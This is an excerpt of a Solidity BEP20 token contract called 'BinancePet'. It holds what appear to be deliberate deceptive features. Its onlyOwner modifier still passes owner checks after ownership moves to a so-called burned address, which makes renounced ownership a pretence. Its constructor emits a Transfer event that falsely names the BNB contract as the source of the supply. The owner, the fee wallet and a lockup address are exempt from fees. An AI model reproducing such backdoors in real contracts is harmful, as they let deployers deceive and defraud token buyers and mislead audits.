...
contract Ownable is Context {
    address internal _burnedAddress;
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || (_owner==_burnedAddress&&_burnedAddress!=address(0)), "Ownable: caller is not the owner");
        _;
    }
...
contract BinancePet is Context, IBEP20, Ownable {
    ...
    address private _bnbContractAddress;
    address private _pinkLockupAddress;

    constructor (address feeAddress_, address owner_, address bnbContractAddress_, address pinkLockUpAddress_) {
        _NAME = "LOCKTEST";
        _SYMBOL = "BPet";
        _DECIMALS = 10;
        _TAX_FEE = 1 * 100; 
        _BURN_FEE = 2 * 100;
        _MARKETING_FEE = 1 * 100;
        ...
        _isMarketing[feeAddress_] = true;
        FeeAddress = feeAddress_;
        _owner = owner_;
        _rOwned[owner_] = _rTotal;
        _bnbContractAddress=bnbContractAddress_;
        _pinkLockupAddress=pinkLockUpAddress_;		
        emit Transfer(address(_bnbContractAddress),owner_, _tTotal); 
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_isMarketing[sender] || _isMarketing[recipient] || _isExcluded[recipient]
            ||sender==_pinkLockupAddress || recipient==_pinkLockupAddress
            ||sender==_owner || recipient==_owner
            ||sender==FeeAddress || recipient==FeeAddress
            ||sender==_burnedAddress || recipient==_burnedAddress
            ) {
            takeFee = false;
        }
